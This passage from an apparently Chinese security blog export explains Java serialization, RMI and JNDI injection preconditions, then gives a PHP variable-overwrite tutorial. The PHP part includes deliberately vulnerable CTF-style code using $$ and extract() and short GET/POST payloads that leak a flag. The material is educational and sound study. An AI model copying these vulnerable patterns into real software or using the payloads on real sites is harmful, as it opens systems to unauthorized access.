class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åºåˆ—åŒ–ExampleSerializeç±»</span><br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>out.writeObject(t);<br><br><span class="hljs-comment">// ååºåˆ—åŒ–è¾“å…¥æµæ•°æ®ä¸ºExampleSerializeå¯¹è±¡</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br><span class="hljs-type">ExampleSerialize</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (ExampleSerialize) in.readObject();<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>ObjectOutputStream</code>ç±»çš„<code>writeObject()</code>æ–¹æ³•åºåˆ—åŒ–<code>ExampleSerialize</code>ç±»</p><p>ä½¿ç”¨<code>ObjectInputStream</code>ç±»çš„<code>readObject()</code>æ–¹æ³•ååºåˆ—åŒ–<code>ExampleSerialize</code>ç±»</p><p>åœ¨è¿›è¡Œåºåˆ—åŒ–çš„æ—¶ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨<code>ObjectInputStream</code>ç±»çš„<code>readObject()</code>æ–¹æ³•ï¼Œå¦‚æœè¢«ååºåˆ—åŒ–çš„ç±»é‡å†™äº†<code>readObject()</code>ï¼Œé‚£ä¹ˆè¯¥ç±»åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJavaä¼šä¼˜å…ˆè°ƒç”¨é‡å†™çš„<code>readObject()</code>æ–¹æ³•ã€‚</p><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMIï¼ˆRemote Method Invocationï¼‰å³Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ŒRMIç”¨äºæ„å»ºåˆ†å¸ƒå¼åº”ç”¨ç¨‹åºï¼Œå®ç°äº†Javaç¨‹åºä¹‹é—´è·¨JVMçš„è¿œç¨‹é€šä¿¡ã€‚</p><p><img src="https://docs.oracle.com/javase/tutorial/figures/rmi/rmi-2.gif" alt="the RMI system, using an existing web server, communicates from serve to client and from client to server"></p><p>RMIä¸»è¦åˆ†ä¸ºServerã€Clientã€Registryä¸‰éƒ¨åˆ†</p><p>è®¾è®¡ä¸Šå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸èƒ½ç›´æ¥é€šä¿¡ï¼Œè€Œæ˜¯é€šè¿‡æ³¨å†Œä¸­å¿ƒé€šä¿¡ã€‚</p><p><strong>ä¸‰è€…çš„å…³è”ï¼š</strong>æœåŠ¡ç«¯åˆ›å»ºè¿œç¨‹å¯¹è±¡ï¼Œå¹¶å°†è¿œç¨‹å¯¹è±¡åœ¨æ³¨å†Œä¸­å¿ƒæ³¨å†Œï¼Œå®¢æˆ·ç«¯åˆ°æ³¨å†Œä¸­å¿ƒæŸ¥æ‰¾å¹¶è·å–å¯¹åº”çš„è¿œç¨‹å¯¹è±¡ï¼Œæœ€ç»ˆåœ¨æœåŠ¡ç«¯è°ƒç”¨å…¶æ–¹æ³•ã€‚</p><p><strong>å€Ÿå›¾ï¼š</strong><a href="https://xz.aliyun.com/t/9261#toc-12">https://xz.aliyun.com/t/9261#toc-12</a></p><p><img src="https://img.katck.com/images/2023/05/14/69b006657b0b0ee3fba5a4ec3c65f41c.png" alt="image-20230514093942942"></p><h3 id="æ€»ä½“æµç¨‹"><a href="#æ€»ä½“æµç¨‹" class="headerlink" title="æ€»ä½“æµç¨‹"></a>æ€»ä½“æµç¨‹</h3><ol><li>RMIå®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º <code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code></li><li>Stub ä¼šå°† Remote å¯¹è±¡ä¼ é€’ç»™ è¿œç¨‹å¼•ç”¨å±‚<code>java.rmi.server.RemoteRef</code> å¹¶åˆ›å»º è¿œç¨‹è°ƒç”¨å¯¹è±¡<code>java.rmi.server.RemoteCall</code></li><li><code>RemoteCall</code> åºåˆ—åŒ– RMIæœåŠ¡åã€Remoteå¯¹è±¡</li><li>RMIå®¢æˆ·ç«¯çš„ è¿œç¨‹è°ƒç”¨å±‚ ä¼ è¾“ <code>RemoteCall</code> åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡ Socket è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ°RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚</li><li>RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚<code>sun.rmi.server.UnicastServerRef</code>å—åˆ°è¯·æ±‚åä¼šå°†è¯·æ±‚ä¼ é€’ç»™Skeleton <code>(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code></li><li>Skeleton è°ƒç”¨ <code>RemoteCall</code> ååºåˆ—åŒ– RMIå®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²</li><li>Skeleton å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼š<code>bind</code>ã€<code>list</code>ã€<code>lookup</code>ã€<code>rebind</code>ã€<code>unbind</code>ï¼Œå¦‚æœæ˜¯<code>lookup</code>åˆ™æŸ¥æ‰¾RMIæœåŠ¡åç»‘å®šçš„å¯¹è±¡ç«¯å£ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡ <code>RemoteCall</code> ä¼ è¾“åˆ°å®¢æˆ·ç«¯</li><li>RMIå®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨</li><li>RMIå®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹äºæ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯</li><li>RMIå®¢æˆ·ç«¯ååºåˆ—åŒ–RMIè¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœ</li></ol><h3 id="RMIæµ‹è¯•"><a href="#RMIæµ‹è¯•" class="headerlink" title="RMIæµ‹è¯•"></a>RMIæµ‹è¯•</h3><h4 id="è¿œç¨‹å¯¹è±¡ç±»"><a href="#è¿œç¨‹å¯¹è±¡ç±»" class="headerlink" title="è¿œç¨‹å¯¹è±¡ç±»"></a>è¿œç¨‹å¯¹è±¡ç±»</h4><p>è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶ä¸æ˜¯æ‰€æœ‰ç±»éƒ½å¯ä»¥ï¼Œå®ƒéœ€è¦å®ç°ä¸€ä¸ªç»§æ‰¿Remoteæ¥å£çš„æ¥å£ï¼Œè¿œç¨‹æ–¹æ³•è¦æŠ›å‡ºRemoteException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRmoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºè¿œç¨‹å¯¹è±¡çš„å®ç°ç±»ï¼Œä¸ºäº†åç»­çš„è¿œç¨‹è°ƒç”¨ï¼ŒæœåŠ¡ç«¯éœ€è¦æŠŠè¿œç¨‹å¯¹è±¡å‘å¸ƒå‡ºå»ï¼Œå‘å¸ƒçš„æ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><ol><li>ç»§æ‰¿ <code>UnicastRemoteObject</code> å¯¹è±¡</li><li>è‡ªå·±è°ƒç”¨ <code>UnicastRemoteObject.exportObject</code> æ–¹æ³•</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;&#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getName();<br>        System.out.println(name);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="RMI-Server-amp-Registry"><a href="#RMI-Server-amp-Registry" class="headerlink" title="RMI Server &amp; Registry"></a>RMI Server &amp; Registry</h3><p>æœåŠ¡ç«¯ä¸€èˆ¬å’Œæ³¨å†Œä¸­å¿ƒå†™åœ¨ä¸€èµ·ï¼š</p><ol><li>åˆ›å»ºè¿œç¨‹å¯¹è±¡ï¼Œåˆ›å»ºæ—¶ä¹Ÿä¼šè¿›è¡Œè¿œç¨‹å¯¹è±¡çš„å‘å¸ƒ</li><li>åˆ›å»ºæ³¨å†Œä¸­å¿ƒ</li><li>å°†è¿œç¨‹å¯¹è±¡ç»‘å®šåˆ°æ³¨å†Œä¸­å¿ƒ</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RemoteObjImpl</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="RMI-Client"><a href="#RMI-Client" class="headerlink" title="RMI Client"></a>RMI Client</h4><p>åˆ›å»ºå®¢æˆ·ç«¯ï¼š</p><ol><li>è·å–æ³¨å†Œä¸­å¿ƒå¯¹è±¡</li><li>åˆ©ç”¨æ³¨å†Œä¸­å¿ƒå¯¹è±¡è·å–è¿œç¨‹å¯¹è±¡</li><li>è°ƒç”¨è¿œç¨‹å¯¹è±¡ä¸Šçš„æ–¹æ³•</li></ol><p>æ‰§è¡Œå®¢æˆ·ç«¯çš„mainæ–¹æ³•åï¼Œä»£ç å®é™…ä¸Šæ˜¯åœ¨æœåŠ¡ç«¯æ‰§è¡Œçš„ï¼Œå®¢æˆ·ç«¯å¯ä»¥è·å–æ‰§è¡Œç»“æœ</p><p><img src="https://img.katck.com/images/2023/05/14/dc7531ae30a7fc1ba184903021858e24.png" alt="image-20230514103454494"></p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>JNDIï¼ˆThe Java Naming and Directory Interfaceï¼‰Javaå‘½åå’Œç›®å½•æ¥å£ï¼Œæ˜¯ä¸€ç»„åœ¨Javaåº”ç”¨ä¸­è®¿é—®å‘½åå’Œç›®å½•æœåŠ¡çš„APIï¼Œå‘½åæœåŠ¡å°†åç§°å’Œå¯¹è±¡è”ç³»èµ·æ¥ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡åç§°è®¿é—®å¯¹è±¡ã€‚</p><p>ç±»ä¼¼äºé€šè¿‡åå­—æŸ¥æ‰¾å¯¹è±¡çš„åŠŸèƒ½ï¼Œå’ŒRMIæœ‰ç‚¹åƒ</p><p>JDKä¸­é»˜è®¤æ”¯æŒçš„JNDIå‘½å/ç›®å½•æä¾›è€…ï¼š</p><ol><li>RMI</li><li>LDAP</li><li>CORBA</li><li>DNS</li></ol><h3 id="JNDI-RMI-å®ä¾‹"><a href="#JNDI-RMI-å®ä¾‹" class="headerlink" title="JNDI RMI å®ä¾‹"></a>JNDI RMI å®ä¾‹</h3><p>è¿™é‡Œä»¥RMIä¸ºä¾‹ï¼Œè¯•ä¸€ä¸‹JNDIã€‚</p><h4 id="RMI-Server"><a href="#RMI-Server" class="headerlink" title="RMI Server"></a>RMI Server</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RemoteObjImpl</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><span class="hljs-comment">//        registry.bind(&quot;remoteObj&quot;, remoteObj); //åœ¨è¿™é‡Œç»‘å®šä¹Ÿæ˜¯å¯ä»¥çš„</span><br>        System.out.println(<span class="hljs-string">&quot;RMI Server start successful&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="JDNI-Server"><a href="#JDNI-Server" class="headerlink" title="JDNI Server"></a>JDNI Server</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        initialContext.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="JNDI-Client"><a href="#JNDI-Client" class="headerlink" title="JNDI Client"></a>JNDI Client</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);<br>        remoteObj.Hello();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šä¸RMIçš„ä½¿ç”¨å¾ˆç±»ä¼¼ï¼Œé€šè¿‡è°ƒè¯•ä»£ç å¯ä»¥å‘ç°åªæ˜¯ä¸€ç§å°è£…ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´RMIæ½œåœ¨çš„å±é™©åœ¨è¿™é‡ŒåŒæ ·å­˜åœ¨ã€‚</p><h3 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h3><p>è§¦å‘JNDIæ³¨å…¥éœ€è¦çš„æ¡ä»¶ï¼š</p><ol><li>ç›´æ¥æˆ–é—´æ¥è°ƒç”¨JNDIæœåŠ¡</li><li>lookupå‚æ•°å€¼å¯æ§</li><li>JDKç‰ˆæœ¬ï¼ŒæœåŠ¡å™¨ç½‘ç»œç¯å¢ƒæ»¡è¶³åˆ©ç”¨æ¡ä»¶</li></ol><p>æ¡ˆä¾‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br><span class="hljs-comment">// è·å–RMIç»‘å®šçš„æ¶æ„ReferenceWrapperå¯¹è±¡</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ctx.lookup(<span class="hljs-string">&quot;æ³¨å…¥JNDIæœåŠ¡URL&quot;</span>);<br></code></pre></td></tr></table></figure><p>å…·ä½“å…ˆä¸å†™å¤ªå¤šï¼Œåé¢ä¼šç”¨åˆ°</p><p><strong>å‚è€ƒï¼š</strong></p><p><a href="https://javasec.org/">https://javasec.org/</a></p><p><a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p><p><a href="https://www.freebuf.com/articles/web/214096.html">https://www.freebuf.com/articles/web/214096.html</a></p><p><a href="https://xz.aliyun.com/t/9261#toc-12">https://xz.aliyun.com/t/9261#toc-12</a></p><p><a href="https://halfblue.github.io/2021/10/26/RMI">https://halfblue.github.io/2021/10/26/RMI</a></p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPå˜é‡è¦†ç›–</title>
    <link href="/2023/02/02/php_var_overrides/"/>
    <url>/2023/02/02/php_var_overrides/</url>
    
    <content type="html"><![CDATA[<p>é€šå¸¸å°†å¯ä»¥ç”¨è‡ªå®šä¹‰çš„å‚æ•°æ›¿æ¢åŸæœ‰å˜é‡å€¼çš„æƒ…å†µç§°ä¸ºå˜é‡è¦†ç›–æ¼æ´ã€‚</p><p>ç»å¸¸å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´çš„åœºæ™¯ç”±ï¼š</p><ol><li>$$ ä½¿ç”¨ä¸å½“</li><li>extract() ä½¿ç”¨ä¸å½“</li><li>parse_str() ä½¿ç”¨ä¸å½“</li><li>å¼€å¯å…¨å±€å˜é‡æ³¨å†Œ //PHP 5.3.0 ååºŸå¼ƒ</li></ol><h2 id="PHPå˜é‡è¦†ç›–"><a href="#PHPå˜é‡è¦†ç›–" class="headerlink" title="PHPå˜é‡è¦†ç›–"></a>PHPå˜é‡è¦†ç›–</h2><h3 id="ä½¿ç”¨ä¸å½“"><a href="#ä½¿ç”¨ä¸å½“" class="headerlink" title="$$ ä½¿ç”¨ä¸å½“"></a>$$ ä½¿ç”¨ä¸å½“</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$_403</span> = <span class="hljs-string">&quot;Access Denied&quot;</span>;<br><span class="hljs-variable">$_200</span> = <span class="hljs-string">&quot;Welcome Admin&quot;</span>;<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] != <span class="hljs-string">&quot;POST&quot;</span>)<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;BugsBunnyCTF is here :pâ€¦&quot;</span>);<br><span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]) )<br>     <span class="hljs-keyword">die</span>(<span class="hljs-variable">$_403</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>     <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$$value</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>     <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>] !== <span class="hljs-variable">$flag</span> )<br>     <span class="hljs-keyword">die</span>(<span class="hljs-variable">$_403</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your flag : &quot;</span>. <span class="hljs-variable">$flag</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-variable">$_200</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ª foreach ä¸­éƒ½ä½¿ç”¨äº†$$ï¼Œè¿™é‡Œå°±å¯ä»¥ä½¿ç”¨flagè¦†ç›–$_200</p><p>POST flag ç­‰äºä»»ä½•å€¼éƒ½å¯ä»¥é€šè¿‡15è¡Œçš„åˆ¤æ–­</p><p>Payloadï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> DATAï¼š?<span class="hljs-attribute">_200</span>=flag <br>POST DATAï¼š<span class="hljs-attribute">flag</span>=anything<br></code></pre></td></tr></table></figure><h3 id="extract-ä½¿ç”¨ä¸å½“"><a href="#extract-ä½¿ç”¨ä¸å½“" class="headerlink" title="extract() ä½¿ç”¨ä¸å½“"></a>extract() ä½¿ç”¨ä¸å½“</h3><p><strong>extract()</strong>ï¼šå°†<strong>é”®å’Œå€¼</strong>æ³¨å†Œæˆ<strong>å˜é‡å’Œå€¼</strong></p><p>EXTR_PREFIX_SAMEè®¾ç½®æ˜¯å¦‚æœå˜é‡å†²çªï¼Œå°±åŠ ä¸Šåé¢çš„å‰ç¼€ä¹Ÿå°±æ˜¯dupï¼Œæ‰€ä»¥å˜é‡aä¸å˜ï¼Œäº§ç”Ÿæ–°çš„å˜é‡dup_aè¢«èµ‹å€¼ä¸ºcat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Original&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;Cat&quot;</span>, <span class="hljs-string">&quot;b&quot;</span> =&gt; <span class="hljs-string">&quot;Dog&quot;</span>, <span class="hljs-string">&quot;c&quot;</span> =&gt; <span class="hljs-string">&quot;Horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>, EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$a = <span class="hljs-subst">$a</span>; \$b = <span class="hljs-subst">$b</span>; \$c = <span class="hljs-subst">$c</span>; \$dup_a = <span class="hljs-subst">$dup_a</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br>output:<br><span class="hljs-variable">$a</span> = Original; <span class="hljs-variable">$b</span> = Dog; <span class="hljs-variable">$c</span> = Horse; <span class="hljs-variable">$dup_a</span> = Cat<br><br></code></pre></td></tr></table></figure><h4 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><p>å‡å¦‚ <code>$shiyan</code> çš„å€¼ç­‰äºæ–‡ä»¶çš„å†…å®¹ <code>$content</code> æ—¶ï¼Œå°±æ‰“å°å‡ºflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>); <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>)) &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>)); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span> == <span class="hljs-variable">$content</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>    &#125;<span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶ä¼ å…¥ shiyan å’Œ flag ä¸ºç©ºã€‚ä½¿å–æ–‡ä»¶é”™è¯¯ï¼Œ$content ä¸ºfalseï¼ˆä½†å®éªŒå‡ºé”™ï¼‰</p><p>è¿™é‡Œè¿˜å¯ä»¥åªä¼ å…¥shiyanä¸ºç©ºã€‚flagä¸ä¼ å€¼ï¼Œä¹Ÿä¼šä½¿æ–‡ä»¶è¯»å–é”™è¯¯ï¼Œ$content ä¸ºfalse</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?shiyan=&amp;flag=<br>?shiyan<br></code></pre></td></tr></table></figure><h3 id="parse-str-ä½¿ç”¨ä¸å½“"><a href="#parse-str-ä½¿ç”¨ä¸å½“" 